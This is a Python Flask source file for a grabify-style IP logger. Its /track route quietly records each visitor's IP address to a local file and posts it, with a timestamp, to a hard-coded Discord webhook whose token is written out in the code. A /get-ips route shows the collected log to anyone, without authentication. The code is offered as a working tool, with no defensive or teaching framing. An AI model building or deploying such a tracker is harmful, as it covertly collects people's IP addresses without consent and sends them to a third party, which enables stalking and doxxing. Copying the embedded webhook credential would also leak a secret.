from flask import Flask, request, send_file, jsonify, send_from_directory, render_template_string
import datetime
import requests
import os
import discord
import time

app = Flask(__name__)

DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1339005934621560885/_2fm9uANTatvaLkywG2SmB3rvKboG1P0Bsyd3YjOk9Ig2CoOPwas6oiFtl-xRiRnW4US'

def save_ip(ip_address):
    log_dir = os.path.join(app.root_path, 'IPGRABMETHOD')
    log_file = os.path.join(log_dir, 'ip_log.txt')

    # Ensure the directory exists
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)

    # Create the file if it doesn't exist and append IP address
    with open(log_file, 'a+') as file:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        file.write(f'{timestamp} - {ip_address}\n')

def send_to_discord(ip_address):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data = {
        "content": f"Timestamp: {timestamp}\nIP Address: {ip_address}"
    }
    response = requests.post(DISCORD_WEBHOOK_URL, json=data)
    if response.status_code == 204:
        print("Successfully sent to Discord")
    else:
        print(f"Failed to send to Discord: {response.status_code}")

@app.route('/track', methods=['GET'])
def track_ip():
    try:
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        save_ip(ip_address)
        send_to_discord(ip_address)
        return 'IP Address captured!'
    except Exception as e:
        app.logger.error("Error in /track: %s", e)
        return jsonify({"error": str(e)}), 500

@app.route('/get-ips', methods=['GET'])
def get_ips():
    try:
        log_file = os.path.join(app.root_path, 'IPGRABMETHOD', 'ip_log.txt')
        with open(log_file, 'r') as file:
            ip_log = file.read()
        return f'<pre>{ip_log}</pre>'
    except Exception as e:
        app.logger.error("Error in /get-ips: %s", e)
        return jsonify({"error": str(e)}), 500

@app.route('/')
def index():
    try:
        with open(os.path.join(app.root_path, '..', 'grabify.html')) as f:
            html_content = f.read()
        return render_template_string(html_content)
    except Exception as e:
        app.logger.error("Error loading HTML: %s", e)
        return jsonify({"error": str(e)}), 500

# Additional Routes for Serving Static Files
@app.route('/Styling/<path:filename>')
def serve_styling(filename):
    return send_from_directory(os.path.join(app.root_path, '..', 'Styling'), filename)

@app.route('/Images/<path:filename>')
def serve_images(filename):
    return send_from_directory(os.path.join(app.root_path, '..', 'Images'), filename)

if __name__ == '__main__':
    app.run(port=3000)
